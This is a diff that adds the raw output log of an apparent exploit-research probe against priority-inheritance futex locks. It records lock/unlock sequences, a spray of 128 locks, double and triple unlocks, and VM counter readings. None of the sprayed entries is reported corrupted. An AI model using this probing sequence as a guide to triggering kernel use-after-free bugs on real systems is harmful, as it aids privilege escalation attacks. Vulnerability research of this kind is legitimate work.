@@ -1,0 +1,41 @@
+=== PROBE 145c: PI DOUBLE-UNLOCK UAF ===
+pid=803
+gpu=0x0000000310C10000
+tid=102208
+
+--- [A] Futex qword analysis ---
+[A] pre-lock: lo=0x0 hi=0x0
+[A] LOCK rv=0x0000000000000000
+[A] post-lock: lo=0x80000000 hi=0x0
+[A] qword=0x0000000080000000
+[A] UNLOCK rv=0x0000000000000000
+[A] post-unlock: lo=0x80000000 hi=0x0
+
+--- [B] Triple unlock sequence ---
+[B] lock rv=0x0000000000000000 futex=0x80000000
+[B] unlock1 rv=0x0000000000000000 futex=0x80000000
+[B] unlock2 rv=0x0000000000000000 futex=0x80000000
+[B] unlock3 rv=0x0000000000000000 futex=0x80000000
+[B] pid=803
+
+--- [C] UAF spray: lock → unlock → spray 128 → double-unlock ---
+[C] lock rv=0x0000000000000000
+[C] unlock rv=0x0000000000000000
+[C] sprayed 128/128 PI locks
+[C] double-unlock rv=0x0000000000000000
+[C] target futex=0x80000000
+[C] corrupted spray entries: 0/128
+[C] pid=803
+
+--- [D] UAF spray with unlock-all after double-unlock ---
+[D] pid=803
+
+--- [E] 624 VM counter before/after ---
+[E] vm_counter=0x0000000000000D36
+
+--- [F] Bulk double-unlock 64x ---
+[F] 64 double-unlocks done
+[F] pid=803
+[F] vm_counter=0x0000000000000D37
+
+=== PROBE 145c COMPLETE ===
